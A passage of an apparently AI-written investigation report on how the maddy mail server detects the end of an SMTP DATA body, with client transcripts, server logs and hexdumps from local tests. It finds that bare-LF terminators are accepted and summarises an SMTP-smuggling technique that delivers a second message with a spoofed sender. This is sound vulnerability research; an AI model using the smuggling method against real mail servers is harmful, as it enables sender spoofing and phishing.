# maddy inbound SMTP `DATA` boundary decision — a runtime-grounded investigation

**Branch:** `maddy_26452dd8dd78` (source), HEAD short `26452dd`
**Scope:** read-only investigation. The only file added to the repository is this document. No existing source file was modified; all observation scripts lived under `/tmp` and were removed on completion (see **Caveats**).

This document answers, from **live runtime observation** (not code reading alone), how maddy's inbound SMTP endpoint decides that a `DATA` message body has ended and resumes command parsing, and how ambiguous message-boundary framing (line endings, dot-stuffing, end-of-`DATA` sequences) changes that decision. Every behavioural claim is tagged **(observed)** — backed by captured output plus the exact command that produced it — or **(inferred)** — derived from reading code. Code claims carry `file:line` references; standards/advisory facts are attributed in prose.

The single most important finding, established below and reconfirmed at runtime: **maddy does not decide the `DATA` boundary itself.** The decision is made two layers down, in the Go standard library's `net/textproto` dot-reader finite-state machine. maddy receives an *already-decoded* body reader. That FSM leniently accepts a bare-LF `<LF>.<LF>` as end-of-mail-data, which is exactly the SMTP-smuggling condition, and maddy ships **no** bare-newline rejection or normalization knob.

---

## 1. Direct-answer summary

**Overall (observed).** At the byte level the end-of-`DATA` decision is taken by the Go stdlib `dotReader` state machine in `net/textproto/reader.go` (`dotReader.Read`, reached by go-smtp's `newDataReader` → `c.text.DotReader()` in `data.go:L53`). maddy's `Session.Data` (`internal/endpoint/smtp/smtp.go:L312`) only ever sees the decoded body; it never scans for the `.` terminator. Because that FSM treats both canonical `<CRLF>.<CRLF>` **and** bare-LF `<LF>.<LF>` as terminators, the framing an attacker chooses changes maddy's *acceptance decision* but not the *delivered bytes* (which are re-normalized to canonical CRLF on relay).

- **Q1 — the boundary-decision moment (observed).** When the terminator is consumed the `dotReader` reaches `stateEOF` and the reader maddy holds returns `io.EOF`. The observable signals, **in their true causal order**, are: the `354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>` greeting; the terminator bytes in the `io_debug` transcript; the message committed to the downstream sink by `delivery.Commit` (`smtp.go:L330`) — so **the delivered bytes reach the sink first**; then the `smtp: accepted {"msg_id":...}` log line (`smtp.go:L334`); and only after `Session.Data` returns does go-smtp drain the reader (`conn.go:L521`) and write the final `250 2.0.0 OK: queued` reply (`conn.go:L522`) before resetting the envelope. The final `250` is therefore the **last** signal, not concurrent with acceptance.
- **Q2 — framing-variation payloads (observed).** Canonical `<CRLF>.<CRLF>` and bare-LF `<LF>.<LF>` are **both accepted**, and their delivered bodies are **byte-identical** (same SHA-256) because `dotReader` rewrites `\r\n`→`\n` on decode and the `smtp_downstream` relay re-encodes to canonical CRLF. Dot-stuffed leading dots (`..`→`.`) are un-stuffed on decode and re-stuffed on relay; a lone-looking-but-not-lone dot line (` .`, `.text`, `embedded . dot`) does **not** terminate.
- **Q3 — pipelined pressure vs a stricter peer (observed).** Terminating the first transaction with a bare-LF `<LF>.<LF>` and pipelining a second `MAIL/RCPT/DATA` in one `send()` makes maddy deliver **two** messages — the second with a spoofed sender — where an RFC-5321-strict peer would treat `<LF>.<LF>` as body and deliver **one**. This is SMTP smuggling.
- **Q4 — back-to-back stability (observed).** The decision is deterministic. Ten identical canonical messages across two independent 5-message batches were all accepted with byte-identical delivered bodies; three back-to-back transactions on one connection all delivered, with an envelope reset between each. No run-to-run wobble was observed.
- **Q5 — a cleaning / blocking front proxy (observed).** A **normalize** proxy (bare `\n`→`\r\n`) does not stop the smuggle — it *manufactures* a canonical `<CRLF>.<CRLF>` boundary, so maddy still delivers two messages. A **reject** proxy (refuse bare `\n`) blocks the traffic upstream: the client gets a `500` from the proxy and maddy delivers nothing, while a fully-canonical message still passes.
- **Q6 — what lingers, and what is expected but never seen (observed).** A connection dropped mid-`DATA` yields `io.ErrUnexpectedEOF` → `DATA error {"reason":"unexpected EOF"}` → `554`, `aborted`, envelope cleared (nothing lingers, nothing delivered). An oversize message yields `552 5.3.4 Maximum message size exceeded`; an over-long line yields `DATA error {"reason":"smtp: too longer line in input stream"}` → `554`. The headline **absence**: maddy emits **no** bare-newline `5xx` rejection — a repository-wide search for any such control returns nothing — the RFC-conformant refusal that peers like Postfix added (`smtpd_forbid_bare_newline`) is exactly what maddy never exhibits.

---
## 2. Per-question findings (Q1–Q6)

For every experiment three observation points are captured: **(1)** the client-side transcript (raw bytes both directions, control chars made visible), **(2)** maddy's log — the `io_debug` raw wire transcript (each chunk prefixed `smtp: `) plus the structured `smtp: accepted` / `smtp: DATA error` lines, and **(3)** the delivered bytes at the capturing sink (post decode-then-re-encode), shown with visible control characters and a hexdump. The faithful code regions for all three layers are collected in **§3**; the questions below cite them by `file:line`.

### Q1 — The boundary-decision moment

**Mechanism (cause → effect).** The client sends the body then the end-of-`DATA` terminator. **Layer 3** — the Go stdlib `dotReader.Read` (`net/textproto/reader.go:L323`) — consumes the terminator: a canonical `.\r\n` walks `stateBeginLine`→`stateDot` (`:L347-348`) →`stateDotCR` (`:L358-359`) →`stateEOF` (`:L369-370`); reaching `stateEOF` makes `Read` return `io.EOF` (`:L401-402`). That EOF is what the reader maddy holds observes. **Layer 2** — go-smtp `Conn.handleData` (`conn.go:L498`) — has already written the `354` greeting (`conn.go:L510`), built the data reader via `newDataReader` → `c.text.DotReader()` (`data.go:L51,L53`), and called `c.Session().Data(r)` (`conn.go:L520`); after `Data` returns it drains the reader with `io.Copy(ioutil.Discard, r)` (`conn.go:L521`), writes the final reply (`conn.go:L522`), and (deferred at `conn.go:L512`) resets the envelope via `Conn.reset` (`conn.go:L694`). **Layer 1** — maddy `Session.Data` (`smtp.go:L312`) — calls `prepareBody` (`smtp.go:L283`), which reads the header with `textproto.ReadHeader` (`smtp.go:L285`), buffers the body with `buffer.BufferInMemory` (`smtp.go:L298`, impl `internal/buffer/memory.go:L27`), and adds a `Received` header via `target.GenerateReceived` (`smtp.go:L303`, impl `internal/target/received.go:L19`; add at `smtp.go:L307`); then it delivers (`delivery.Body` call at `smtp.go:L326`, `delivery.Commit` call at `smtp.go:L330`) and finally logs `s.log.Msg("accepted", ...)` (`smtp.go:L334`). maddy itself **never** parses the `.` — consistent with `HACKING.md:L124-125` ("this is not possible to modify the body contents, only header can be modified"), i.e. the boundary is decided upstream of maddy. **(observed + inferred as noted).**

**Causal order (corrected, code-grounded).** The three completion signals do **not** fire together. Inside `Session.Data`, `delivery.Commit` (`smtp.go:L330`) hands the message to the `smtp_downstream` relay — so the message reaches the sink **before** the `smtp: accepted` line is logged at `smtp.go:L334`. `Session.Data` then returns to go-smtp's `handleData`, which only **after** the return drains the reader with `io.Copy(ioutil.Discard, r)` (`conn.go:L521`) and writes the final `250 2.0.0 OK: queued` at `conn.go:L522`. Thus the observed order is: terminator consumed → **delivered to sink** → `accepted` logged → `Session.Data` returns → reader drained → `250` written. The `250` is the last event, and it is written by **go-smtp**, not by maddy's `Session.Data`.

The exact byte at which command parsing resumes is the byte immediately after the terminator line (`.\r\n` here): once `dotReader` returns EOF, `handleData` writes `250` and the connection's `net/textproto` reader parses whatever bytes follow as the next command (see Q3 for the pipelined case).

**Exact commands and complete, unedited output (run 1 of 2).** Three channels are captured per run: the client-side transcript (`stdout` of the raw client), maddy's `io_debug` raw-wire + structured log (the per-run delta of `/tmp/maddy-smtp/maddy.log`), and the delivered bytes at the sink (the per-run delta of `/tmp/maddy-smtp/sink.log`).

Channel 1 — client transcript (note the **sent** end-of-`DATA` terminator `.<CR><LF>` and the client-observed `250 2.0.0 OK: queued`):
```text
$ python3 /tmp/maddy-smtp/rawclient.py canonical 127.0.0.1 2525
### rawclient mode=canonical target=127.0.0.1:2525
[S->C greeting]
220 test.local ESMTP Service Ready<CR><LF>

[C->S]
EHLO client.test<CR><LF>

[S->C]
250-Hello client.test<CR><LF>
250-PIPELINING<CR><LF>
250-8BITMIME<CR><LF>
250-ENHANCEDSTATUSCODES<CR><LF>
250-SMTPUTF8<CR><LF>
250 SIZE 33554432<CR><LF>

[C->S]
MAIL FROM:<sender@example.com><CR><LF>

[S->C]
250 2.0.0 Roger, accepting mail from <sender@example.com><CR><LF>

[C->S]
RCPT TO:<rcpt@example.com><CR><LF>

[S->C]
250 2.0.0 I'll make sure <rcpt@example.com> gets this<CR><LF>

[C->S]
DATA<CR><LF>

[S->C 354]
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>

[C->S body]
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
BODYLINE-ONE canonical body.<CR><LF>
BODYLINE-TWO second line.<CR><LF>

[C->S end-of-DATA terminator]
.<CR><LF>

[S->C 250?]
250 2.0.0 OK: queued<CR><LF>

[C->S]
QUIT<CR><LF>

[S->C]
221 2.0.0 Goodnight and good luck<CR><LF>

### rawclient done (mode=canonical)
```

Channel 2 — maddy `io_debug` raw-wire transcript (both directions, each chunk prefixed `smtp: `) interleaved with the structured log; the terminator arrives as the lone `smtp: .` chunk, then `delivery.Body ok` -> `accepted` -> the final `250`:
```text
$ # per-run delta of /tmp/maddy-smtp/maddy.log (io_debug yes + debug yes)
smtp: 220 test.local ESMTP Service Ready

smtp: EHLO client.test

smtp: 250-Hello client.test

smtp: 250-PIPELINING

smtp: 250-8BITMIME

smtp: 250-ENHANCEDSTATUSCODES

smtp: 250-SMTPUTF8

smtp: 250 SIZE 33554432

smtp: MAIL FROM:<sender@example.com>

smtp: incoming message	{"msg_id":"45dc21e0","sender":"sender@example.com","src_host":"client.test","src_ip":"127.0.0.1:42814"}
[debug] smtp/pipeline: sender sender@example.com matched by default rule	{"msg_id":"45dc21e0"}
smtp: 250 2.0.0 Roger, accepting mail from <sender@example.com>

smtp: RCPT TO:<rcpt@example.com>

[debug] smtp/pipeline: global rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"45dc21e0"}
[debug] smtp/pipeline: per-source rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"45dc21e0"}
[debug] smtp/pipeline: recipient rcpt@example.com matched by default rule (clean = rcpt@example.com)	{"msg_id":"45dc21e0"}
[debug] smtp/pipeline: per-rcpt modifiers: rcpt@example.com => rcpt@example.com	{"msg_id":"45dc21e0"}
[debug] smtp_downstream: connected	{"downstream_server":"127.0.0.1","msg_id":"45dc21e0"}
[debug] smtp_downstream: connected	{"msg_id":"45dc21e0","remote_server":"127.0.0.1"}
[debug] smtp/pipeline: tgt.Start(sender@example.com) ok, target = smtp_downstream:	{"msg_id":"45dc21e0"}
smtp: RCPT ok	{"msg_id":"45dc21e0","rcpt":"rcpt@example.com"}
smtp: 250 2.0.0 I'll make sure <rcpt@example.com> gets this

smtp: DATA

smtp: 354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF>

smtp: From: sender@example.com
To: rcpt@example.com
Subject: framing probe

BODYLINE-ONE canonical body.
BODYLINE-TWO second line.

smtp: .

[debug] smtp/pipeline: delivery.Body ok, Delivery object = *msgpipeline.delivery	{"msg_id":"45dc21e0"}
smtp: accepted	{"msg_id":"45dc21e0"}
smtp: 250 2.0.0 OK: queued

[debug] smtp: reset
smtp: QUIT

smtp: 221 2.0.0 Goodnight and good luck
```

Channel 3 — the delivered message at the sink (post decode-then-re-encode): the visible-control-chars body, its hexdump (note `0d 0a` = CRLF throughout), and the raw wire bytes the relay actually transmitted including the re-encoded `.<CR><LF>` terminator:
```text
$ # per-run delta of /tmp/maddy-smtp/sink.log
========== DELIVERED MESSAGE #1 from 127.0.0.1:41220 ==========
ENVELOPE MAIL FROM:<sender@example.com> BODY=8BITMIME
ENVELOPE RCPT TO:<rcpt@example.com>
--- delivered body (unstuffed, 296 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id 45dc21e0; Mon, 13 Jul<CR><LF>
 2026 18:11:16 +0000<CR><LF>
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
BODYLINE-ONE canonical body.<CR><LF>
BODYLINE-TWO second line.<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 73 65 6e 64 65 72 40 65 78 61 6d  |der <sender@exam|
00000060  70 6c 65 2e 63 6f 6d 3e 29 20 77 69 74 68 20 45  |ple.com>) with E|
00000070  53 4d 54 50 20 69 64 20 34 35 64 63 32 31 65 30  |SMTP id 45dc21e0|
00000080  3b 20 4d 6f 6e 2c 20 31 33 20 4a 75 6c 0d 0a 20  |; Mon, 13 Jul.. |
00000090  32 30 32 36 20 31 38 3a 31 31 3a 31 36 20 2b 30  |2026 18:11:16 +0|
000000a0  30 30 30 0d 0a 46 72 6f 6d 3a 20 73 65 6e 64 65  |000..From: sende|
000000b0  72 40 65 78 61 6d 70 6c 65 2e 63 6f 6d 0d 0a 54  |r@example.com..T|
000000c0  6f 3a 20 72 63 70 74 40 65 78 61 6d 70 6c 65 2e  |o: rcpt@example.|
000000d0  63 6f 6d 0d 0a 53 75 62 6a 65 63 74 3a 20 66 72  |com..Subject: fr|
000000e0  61 6d 69 6e 67 20 70 72 6f 62 65 0d 0a 0d 0a 42  |aming probe....B|
000000f0  4f 44 59 4c 49 4e 45 2d 4f 4e 45 20 63 61 6e 6f  |ODYLINE-ONE cano|
00000100  6e 69 63 61 6c 20 62 6f 64 79 2e 0d 0a 42 4f 44  |nical body...BOD|
00000110  59 4c 49 4e 45 2d 54 57 4f 20 73 65 63 6f 6e 64  |YLINE-TWO second|
00000120  20 6c 69 6e 65 2e 0d 0a                          | line...|
00000128
--- raw wire bytes received for DATA (incl terminator, 299 bytes) ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id 45dc21e0; Mon, 13 Jul<CR><LF>
 2026 18:11:16 +0000<CR><LF>
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
BODYLINE-ONE canonical body.<CR><LF>
BODYLINE-TWO second line.<CR><LF>
.<CR><LF>

========== END MESSAGE #1 (saved /tmp/maddy-smtp/delivered/msg-001-90281.bin) ==========
```

**Stability (2 runs).** Run twice on fresh connections: **2/2 accepted, 1 delivered each.** msg_id `45dc21e0` (run 1, maddy `src_ip 127.0.0.1:42814`) and `7edb8802` (run 2, `src_ip 127.0.0.1:44922`); the delivered message portion was **296 bytes** in both runs (the relay transmitted **299** wire bytes including the `.<CR><LF>` terminator). No run-to-run variation observed. The causal order above (sink delivery -> `accepted` -> `250`) was identical in both runs.

---

### Q2 — Framing-variation payloads

**Mechanism (cause → effect).** The variants are **not** all byte-identical bodies. Only the **V-A vs V-B pair** holds the body content constant and varies *only* the framing (canonical `<CRLF>.<CRLF>` + CRLF body lines vs bare-LF `<LF>.<LF>` + bare-LF body lines); V-C, V-D and V-E deliberately change the body bytes to probe specific transparency rules (bare-LF body line-endings, dot-stuffing, and terminator-resembling lines respectively). The decision path inside `dotReader` differs by variant — canonical `.\r\n` terminates via `stateDotCR`->`stateEOF` (`reader.go:L369-370`) whereas a bare-LF `.\n` terminates **directly** from `stateDot` on `\n` (`reader.go:L362-363`). For the V-A/V-B pair the *delivered* body is nonetheless identical, because (a) `dotReader` rewrites `\r\n`->`\n` on decode (a `\r` in `stateData` moves to `stateCR` with `continue`, emitting nothing, then `\n` emits a single `\n`: `reader.go:L390-391,L380-381`) and un-stuffs a leading dot (`stateBeginLine`+`.`->`stateDot`, `continue`, dot elided: `reader.go:L347-348`), and (b) the `smtp_downstream` relay re-encodes the buffered body to canonical CRLF and re-stuffs dots on the wire (`internal/target/smtp_downstream/smtp_downstream.go:L207` opens the buffer; `Commit`->`conn.Data(ctx, d.hdr, d.body)` serializes via the go-smtp client's dot-writer — full anchor chain in §3). **(observed).**

Variants: **V-A** canonical `<CRLF>.<CRLF>` with CRLF body lines; **V-B** bare-LF `<LF>.<LF>` with bare-LF body lines (**same body content as V-A**); **V-C** canonical terminator but bare-LF body lines; **V-D** dot-stuffed leading dots (`..text`, `...text`); **V-E** body lines that resemble the terminator (` .`, `.not-a-terminator`, `embedded . dot in middle`, `trailing dot.`). Each was run twice; **all five were accepted and delivered exactly one message in both runs** (real msg_ids in the Stability note below).

**Exact commands (each run twice).**
```bash
python3 /tmp/maddy-smtp/rawclient.py canonical   127.0.0.1 2525   # V-A
python3 /tmp/maddy-smtp/rawclient.py barelf      127.0.0.1 2525   # V-B
python3 /tmp/maddy-smtp/rawclient.py barelf-body 127.0.0.1 2525   # V-C
python3 /tmp/maddy-smtp/rawclient.py dotstuff    127.0.0.1 2525   # V-D
python3 /tmp/maddy-smtp/rawclient.py resembles   127.0.0.1 2525   # V-E
```

**KEY RESULT — V-A vs V-B deliver byte-identical bodies despite different wire framing.** The client sent CRLF body lines + `<CRLF>.<CRLF>` (V-A) versus bare-LF body lines + `<LF>.<LF>` (V-B); both were accepted, and the delivered message portions (the body-only extract, from `From:` onward, saved as `VA_body.bin`/`VB_body.bin`) are identical byte-for-byte — identical SHA-256, and note the `0d 0a` line endings in **both** hexdumps (proof that the bare-LF wire framing of V-B was normalized to CRLF on delivery):
```text
$ sha256sum VA_body.bin VB_body.bin
6fafed38f64a7386bbc798e3f3f801fc9d023b71bf1a6e00f8af8b402fc47932  VA_body.bin
6fafed38f64a7386bbc798e3f3f801fc9d023b71bf1a6e00f8af8b402fc47932  VB_body.bin
$ cmp VA_body.bin VB_body.bin && echo IDENTICAL
IDENTICAL

$ hexdump -C VA_body.bin   # V-A: canonical CRLF.CRLF terminator on the wire
00000000  46 72 6f 6d 3a 20 73 65  6e 64 65 72 40 65 78 61  |From: sender@exa|
00000010  6d 70 6c 65 2e 63 6f 6d  0d 0a 54 6f 3a 20 72 63  |mple.com..To: rc|
00000020  70 74 40 65 78 61 6d 70  6c 65 2e 63 6f 6d 0d 0a  |pt@example.com..|
00000030  53 75 62 6a 65 63 74 3a  20 66 72 61 6d 69 6e 67  |Subject: framing|
00000040  20 70 72 6f 62 65 0d 0a  0d 0a 42 4f 44 59 4c 49  | probe....BODYLI|
00000050  4e 45 2d 4f 4e 45 20 63  61 6e 6f 6e 69 63 61 6c  |NE-ONE canonical|
00000060  20 62 6f 64 79 2e 0d 0a  42 4f 44 59 4c 49 4e 45  | body...BODYLINE|
00000070  2d 54 57 4f 20 73 65 63  6f 6e 64 20 6c 69 6e 65  |-TWO second line|
00000080  2e 0d 0a                                          |...|
00000083

$ hexdump -C VB_body.bin   # V-B: bare-LF <LF>.<LF> terminator on the wire
00000000  46 72 6f 6d 3a 20 73 65  6e 64 65 72 40 65 78 61  |From: sender@exa|
00000010  6d 70 6c 65 2e 63 6f 6d  0d 0a 54 6f 3a 20 72 63  |mple.com..To: rc|
00000020  70 74 40 65 78 61 6d 70  6c 65 2e 63 6f 6d 0d 0a  |pt@example.com..|
00000030  53 75 62 6a 65 63 74 3a  20 66 72 61 6d 69 6e 67  |Subject: framing|
00000040  20 70 72 6f 62 65 0d 0a  0d 0a 42 4f 44 59 4c 49  | probe....BODYLI|
00000050  4e 45 2d 4f 4e 45 20 63  61 6e 6f 6e 69 63 61 6c  |NE-ONE canonical|
00000060  20 62 6f 64 79 2e 0d 0a  42 4f 44 59 4c 49 4e 45  | body...BODYLINE|
00000070  2d 54 57 4f 20 73 65 63  6f 6e 64 20 6c 69 6e 65  |-TWO second line|
00000080  2e 0d 0a                                          |...|
00000083
```

**V-B — the bare-LF terminator is itself accepted (complete client transcript + maddy accept, msg_id `410a8b94`).** This proves the acceptance *decision* fired on bare-LF framing, not merely that its delivered bytes matched V-A. The complete, unedited client transcript (the body lines and the `.<LF>` terminator are bare-LF; the server still answers `250 2.0.0 OK: queued`):
```text
$ python3 /tmp/maddy-smtp/rawclient.py barelf 127.0.0.1 2525
### rawclient mode=barelf target=127.0.0.1:2525
[S->C greeting]
220 test.local ESMTP Service Ready<CR><LF>

[C->S]
EHLO client.test<CR><LF>

[S->C]
250-Hello client.test<CR><LF>
250-PIPELINING<CR><LF>
250-8BITMIME<CR><LF>
250-ENHANCEDSTATUSCODES<CR><LF>
250-SMTPUTF8<CR><LF>
250 SIZE 33554432<CR><LF>

[C->S]
MAIL FROM:<sender@example.com><CR><LF>

[S->C]
250 2.0.0 Roger, accepting mail from <sender@example.com><CR><LF>

[C->S]
RCPT TO:<rcpt@example.com><CR><LF>

[S->C]
250 2.0.0 I'll make sure <rcpt@example.com> gets this<CR><LF>

[C->S]
DATA<CR><LF>

[S->C 354]
354 2.0.0 Go ahead. End your data with <CR><LF>.<CR><LF><CR><LF>

[C->S body (bare-LF lines)]
From: sender@example.com<LF>
To: rcpt@example.com<LF>
Subject: framing probe<LF>
<LF>
BODYLINE-ONE canonical body.<LF>
BODYLINE-TWO second line.<LF>

[C->S end-of-DATA terminator (bare-LF <LF>.<LF>)]
.<LF>

[S->C 250?]
250 2.0.0 OK: queued<CR><LF>

[C->S]
QUIT<CR><LF>

[S->C]
221 2.0.0 Goodnight and good luck<CR><LF>

### rawclient done (mode=barelf)

$ # maddy structured log (per-run delta): ACCEPTED
smtp: incoming message	{"msg_id":"410a8b94","sender":"sender@example.com","src_host":"client.test","src_ip":"127.0.0.1:41166"}
smtp: accepted	{"msg_id":"410a8b94"}
smtp: 250 2.0.0 OK: queued
```

**V-C — bare-LF body lines, canonical terminator (msg_id `fba35417`).** The bare-LF body lines are delivered normalized to CRLF (`0d 0a`). A trailing blank line (`0d 0a 0d 0a` at the end) appears because the payload ended a line with a bare `\n` and then sent the canonical `<CRLF>.<CRLF>` terminator, so both the bare `\n` and the terminator's leading CRLF each produced a line boundary — an honest consequence of that specific byte sequence, shown complete below:
```text
$ python3 /tmp/maddy-smtp/rawclient.py barelf-body 127.0.0.1 2525
$ # delivered message at the sink:
--- delivered body (unstuffed, 298 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id fba35417; Mon, 13 Jul<CR><LF>
 2026 18:11:54 +0000<CR><LF>
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
BODYLINE-ONE canonical body.<CR><LF>
BODYLINE-TWO second line.<CR><LF>
<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 73 65 6e 64 65 72 40 65 78 61 6d  |der <sender@exam|
00000060  70 6c 65 2e 63 6f 6d 3e 29 20 77 69 74 68 20 45  |ple.com>) with E|
00000070  53 4d 54 50 20 69 64 20 66 62 61 33 35 34 31 37  |SMTP id fba35417|
00000080  3b 20 4d 6f 6e 2c 20 31 33 20 4a 75 6c 0d 0a 20  |; Mon, 13 Jul.. |
00000090  32 30 32 36 20 31 38 3a 31 31 3a 35 34 20 2b 30  |2026 18:11:54 +0|
000000a0  30 30 30 0d 0a 46 72 6f 6d 3a 20 73 65 6e 64 65  |000..From: sende|
000000b0  72 40 65 78 61 6d 70 6c 65 2e 63 6f 6d 0d 0a 54  |r@example.com..T|
000000c0  6f 3a 20 72 63 70 74 40 65 78 61 6d 70 6c 65 2e  |o: rcpt@example.|
000000d0  63 6f 6d 0d 0a 53 75 62 6a 65 63 74 3a 20 66 72  |com..Subject: fr|
000000e0  61 6d 69 6e 67 20 70 72 6f 62 65 0d 0a 0d 0a 42  |aming probe....B|
000000f0  4f 44 59 4c 49 4e 45 2d 4f 4e 45 20 63 61 6e 6f  |ODYLINE-ONE cano|
00000100  6e 69 63 61 6c 20 62 6f 64 79 2e 0d 0a 42 4f 44  |nical body...BOD|
00000110  59 4c 49 4e 45 2d 54 57 4f 20 73 65 63 6f 6e 64  |YLINE-TWO second|
00000120  20 6c 69 6e 65 2e 0d 0a 0d 0a                    | line.....|
0000012a
```

**V-D — dot-stuffing / transparency (RFC 5321 §4.5.2), msg_id `3ff4db42`.** The client sent doubled leading dots; `dotReader` un-stuffs one dot on decode; the `smtp_downstream` relay re-stuffs on the wire. The full round trip is visible below — the client-sent lines (2 dots), the sink's decoded/delivered body (1 dot, at hex offsets `0xef` and `0x11f` the byte is a single `2e`), and the raw wire bytes maddy's relay actually transmitted (dots re-stuffed to 2):
```text
$ python3 /tmp/maddy-smtp/rawclient.py dotstuff 127.0.0.1 2525
$ # (client) body lines SENT on the wire to maddy (leading dots doubled):
[C->S body (dot-stuffed leading dots)]
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
..leading-double-dot should un-stuff to one dot<CR><LF>
...three dots become two<CR><LF>
normal line<CR><LF>

[C->S end-of-DATA terminator (canonical)]

$ # (sink) DELIVERED body, decoded/un-stuffed (one leading dot):
--- delivered body (unstuffed, 325 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id 3ff4db42; Mon, 13 Jul<CR><LF>
 2026 18:11:58 +0000<CR><LF>
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
.leading-double-dot should un-stuff to one dot<CR><LF>
..three dots become two<CR><LF>
normal line<CR><LF>

--- delivered body hexdump ---
00000000  52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 63  |Received: from c|
00000010  6c 69 65 6e 74 2e 74 65 73 74 20 28 6c 6f 63 61  |lient.test (loca|
00000020  6c 68 6f 73 74 20 5b 31 32 37 2e 30 2e 30 2e 31  |lhost [127.0.0.1|
00000030  5d 29 20 62 79 20 74 65 73 74 2e 6c 6f 63 61 6c  |]) by test.local|
00000040  0d 0a 20 28 65 6e 76 65 6c 6f 70 65 2d 73 65 6e  |.. (envelope-sen|
00000050  64 65 72 20 3c 73 65 6e 64 65 72 40 65 78 61 6d  |der <sender@exam|
00000060  70 6c 65 2e 63 6f 6d 3e 29 20 77 69 74 68 20 45  |ple.com>) with E|
00000070  53 4d 54 50 20 69 64 20 33 66 66 34 64 62 34 32  |SMTP id 3ff4db42|
00000080  3b 20 4d 6f 6e 2c 20 31 33 20 4a 75 6c 0d 0a 20  |; Mon, 13 Jul.. |
00000090  32 30 32 36 20 31 38 3a 31 31 3a 35 38 20 2b 30  |2026 18:11:58 +0|
000000a0  30 30 30 0d 0a 46 72 6f 6d 3a 20 73 65 6e 64 65  |000..From: sende|
000000b0  72 40 65 78 61 6d 70 6c 65 2e 63 6f 6d 0d 0a 54  |r@example.com..T|
000000c0  6f 3a 20 72 63 70 74 40 65 78 61 6d 70 6c 65 2e  |o: rcpt@example.|
000000d0  63 6f 6d 0d 0a 53 75 62 6a 65 63 74 3a 20 66 72  |com..Subject: fr|
000000e0  61 6d 69 6e 67 20 70 72 6f 62 65 0d 0a 0d 0a 2e  |aming probe.....|
000000f0  6c 65 61 64 69 6e 67 2d 64 6f 75 62 6c 65 2d 64  |leading-double-d|
00000100  6f 74 20 73 68 6f 75 6c 64 20 75 6e 2d 73 74 75  |ot should un-stu|
00000110  66 66 20 74 6f 20 6f 6e 65 20 64 6f 74 0d 0a 2e  |ff to one dot...|
00000120  2e 74 68 72 65 65 20 64 6f 74 73 20 62 65 63 6f  |.three dots beco|
00000130  6d 65 20 74 77 6f 0d 0a 6e 6f 72 6d 61 6c 20 6c  |me two..normal l|
00000140  69 6e 65 0d 0a                                   |ine..|
00000145

$ # (sink) RAW WIRE bytes maddy's relay actually sent to the sink (dots RE-STUFFED):
--- raw wire bytes received for DATA (incl terminator, 330 bytes) ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id 3ff4db42; Mon, 13 Jul<CR><LF>
 2026 18:11:58 +0000<CR><LF>
From: sender@example.com<CR><LF>
To: rcpt@example.com<CR><LF>
Subject: framing probe<CR><LF>
<CR><LF>
..leading-double-dot should un-stuff to one dot<CR><LF>
...three dots become two<CR><LF>
normal line<CR><LF>
.<CR><LF>
```

**V-E — lines that resemble the end-of-`DATA` marker (msg_id `56b29835`).** None of ` .` (space then dot), `.not-a-terminator` (a single leading dot, un-stuffed to `not-a-terminator`), `embedded . dot in middle`, or `trailing dot.` terminates the message; all four survive in one delivered message. Only a line consisting of exactly one dot terminates — grounded in the FSM: at `stateBeginLine` a `.` moves to `stateDot` (`reader.go:L347-348`); termination requires the *next* byte to be `\n` (`:L362-363`) or `\r\n` (`:L358-359,L369-370`); any other byte moves to `stateData` (`:L366`) and the line is ordinary body:
```text
$ python3 /tmp/maddy-smtp/rawclient.py resembles 127.0.0.1 2525
$ # delivered message at the sink (all four resembling lines survived as ONE message):
--- delivered body (unstuffed, 302 bytes) visible-control-chars ---
Received: from client.test (localhost [127.0.0.1]) by test.local<CR><LF>
 (envelope-sender <sender@example.com>) with ESMTP id 56b29835; Mon, 13 Jul<CR><LF>
 2026 18:12:03 +0000<CR><LF>
From: sender@example.com<CR><LF>
